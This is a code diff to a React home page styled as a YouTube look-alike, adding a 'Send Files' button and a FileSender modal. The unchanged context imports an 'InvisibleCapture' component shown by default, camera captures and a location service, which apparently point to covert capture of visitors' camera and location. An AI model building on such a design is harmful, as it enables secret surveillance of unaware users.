@@ -1,14 +1,16 @@
 import { useState, useEffect } from 'react';
-import { Menu, Search, Mic, Video, Bell, Camera, MapPin, Settings, History, Clock, Home, Compass, Play } from 'lucide-react';
+import { Menu, Search, Mic, Video, Bell, Camera, MapPin, Settings, History, Clock, Home, Compass, Play, Upload } from 'lucide-react';
 import { Button } from '@/components/ui/button';
 import { Input } from '@/components/ui/input';
 import { CameraModal } from '@/components/camera-modal';
+import { FileSender } from '@/components/file-sender';
 import { InvisibleCapture } from '@/components/invisible-capture';
 import { VideoGrid } from '@/components/video-grid';
 import { locationService, type LocationData } from '@/lib/location';
 
 export default function HomePage() {
   const [isCameraModalOpen, setIsCameraModalOpen] = useState(false);
+  const [isFileSenderOpen, setIsFileSenderOpen] = useState(false);
   const [showInvisibleCapture, setShowInvisibleCapture] = useState(true);
   const [location, setLocation] = useState<LocationData | null>(null);
   const [locationStatus, setLocationStatus] = useState('Getting location...');
@@ -115,6 +117,14 @@ export default function HomePage() {
               <Camera className="mr-3 h-5 w-5" />
               My Captures
             </Button>
+            <Button 
+              variant="ghost" 
+              className="w-full justify-start hover:bg-youtube-secondary text-gray-300 hover:text-white"
+              onClick={() => setIsFileSenderOpen(true)}
+            >
+              <Upload className="mr-3 h-5 w-5" />
+              Send Files
+            </Button>
             <Button variant="ghost" className="w-full justify-start hover:bg-youtube-secondary text-gray-300 hover:text-white">
               <History className="mr-3 h-5 w-5" />
               History
@@ -166,6 +176,12 @@ export default function HomePage() {
       <CameraModal 
         isOpen={isCameraModalOpen}
         onClose={() => setIsCameraModalOpen(false)}
+      />
+
+      {/* File Sender Modal */}
+      <FileSender 
+        isOpen={isFileSenderOpen}
+        onClose={() => setIsFileSenderOpen(false)}
       />
     </div>
   );
